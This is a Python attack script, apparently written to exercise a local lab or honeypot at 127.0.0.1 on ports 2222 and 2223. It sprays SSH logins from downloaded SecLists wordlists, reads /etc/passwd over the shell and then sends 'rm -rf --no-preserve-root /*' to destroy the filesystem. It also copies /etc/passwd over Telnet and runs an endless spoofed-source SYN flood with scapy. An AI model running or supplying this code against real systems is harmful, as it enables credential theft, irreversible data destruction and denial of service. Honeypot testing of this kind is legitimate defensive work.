from pwn import *
from scapy.all import *
import random
import time
import paramiko
import requests
import shutil
import gzip
import telnetlib

# Download the common passwords file
def download_file(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_filename

def connect_passw_spray(host, port, timeout, url_username, url_password):
    attempts = 0
    user_file = download_file(url_username)
    pass_file = download_file(url_password)
    print("*** Attempts ***")
    #Decompress the file and read line per line
    user_list = gzip.open(user_file, "rb")
    pass_list = gzip.open(pass_file, "rb")
    for user in user_list:
        username  = user.decode("utf-8").strip("\n")
        # Reset the password iterator for every username
        pass_list.seek(0)
        for passw in pass_list:
            password  = passw.decode("utf-8").strip("\n")
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
                client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=timeout,
                    look_for_keys=False,
                    allow_agent=False
                )
                print("[{}] Valid credentials found: '{}, {}'".format(attempts, username, password))
                return client, username, password
            except paramiko.ssh_exception.AuthenticationException:
                print("[{}] Invalid credentials: '{}, {}'".format(attempts, username, password))
            except paramiko.ssh_exception.SSHException:
                print("[{}] Connection closed".format(attempts))
            except Exception as e:
                print(e)
            attempts += 1
    print("Password spray failed")
    return None, None, None

def connect_telnet(target_ip, target_port, username, password):
    print("*** Telnet Connection ***")
    try:
        tn = telnetlib.Telnet(target_ip, target_port, timeout=10)
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        
        # Vérifiez si un prompt est retourné après le login
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        if "$" in response or "~$" in response:
            print("Telnet connection successful.")
            return tn
        else:
            print("Login failed.")
            return None
    except Exception as e:
        print(f"Telnet error: {e}")
        return None

def exfiltrate_files_telnet(tn):
    print("*** Exfiltrating /etc/passwd via Telnet ***")
    try:
        # Envoyer la commande pour lire le fichier
        tn.write(b"cat /etc/passwd\n")
        response = tn.read_until(b"$", timeout=5).decode('ascii')
        
        # Sauvegarder le contenu localement
        with open("exfiltrated_passwd_telnet.txt", "w") as f:
            f.write(response)
        
        print("Exfiltration complete. Content saved to exfiltrated_passwd_telnet.txt")
    except Exception as e:
        print(f"Error during file exfiltration: {e}")

def get_output(shell):
    # Initialize buffer and loop to collect output
    output = ""
    timeout = 2  # seconds
    end_time = time.time() + timeout
    while True:
        if shell.recv_ready():
            data = shell.recv(4096).decode('utf-8')
            output += data
            # Reset the timeout if data is received
            end_time = time.time() + timeout
        elif time.time() > end_time:
            # Break the loop if no data is received within the timeout
            break
    return output

def ssh_attack(target_ip, target_port):
    print(f"***** BEGIN PASSWORD SRAY ATTACK on {target_ip}:{target_port} *******")
    timeout = None
    url_user = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt"
    url_pass = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/top-passwords-shortlist.txt"
    client, username, password = connect_passw_spray(target_ip, target_port, timeout, url_user, url_pass)
    if client is None :
        return
    try:
        print("*** Send shell commands to target ***")
        shell = client.invoke_shell()
        print("*** Send 'cat /etc/passwd' ***")
        shell.send('cat /etc/passwd\n')
        output = get_output(shell)
        print("*** Received message len = {} ***".format(len(output)))
        print(output)
        # Send the commands to delete all files from root folder
        print("*** Send 'rm -rf --no-preserve-root /*' ***")
        shell.send('rm -rf --no-preserve-root /*\n')
        print("*** Send 'cat /etc/passwd', file should not exist ***")
        shell.send('cat /etc/passwd\n')
        output = get_output(shell)
        print("*** Received message len = {} ***".format(len(output)))
        print(output)
        if len(output) == 0:
            print("*** Filesystem corruption attack : all files deleted ***")
    except Exception as e:
        print(e)
    finally:
        client.close()
    print("***** END SSH ATTACK *******")
    return username, password

def telnet_attack(target_ip, target_port, username, password):
    print(f"***** BEGIN SENSITIVE DATA EXPOSURE ATTACK on {target_ip}:{target_port} *******")
    # Connect to Telnet
    telnet_client = connect_telnet(target_ip, target_port, username, password)
    if telnet_client:
        # Exfiltrate files via Telnet
        exfiltrate_files_telnet(telnet_client)

        # Close the Telnet connection
        telnet_client.close()
    print("***** END TELNET ATTACK *******")

# Function to generate a random source IP address
def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

# SYN flood attack function
def syn_flood_attack(target_ip, target_port):
    print(f"***** BEGIN SYN FLOOD ATTACK on {target_ip}:{target_port} *******")
    # Loop to continuously send SYN packets
    while True:
        # Generate a random source IP address
        source_ip = generate_random_ip()
        # Create IP and TCP layer
        ip = IP(src=source_ip, dst=target_ip)
        syn = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1, 1000))
        # Send the SYN packet
        send(ip / syn, verbose=False)
        time.sleep(0.1)
    print("***** END DDOS ATTACK *******")

def main():
    ip = "127.0.0.1"
    ssh_port = 2222
    telnet_port =  2223
    #fist attack
    username, password = ssh_attack(ip, ssh_port)
    #second attack
    telnet_attack(ip, telnet_port, username, password)
    #third attack
    syn_flood_attack(ip, ssh_port)

if __name__ == "__main__":
    main()
    
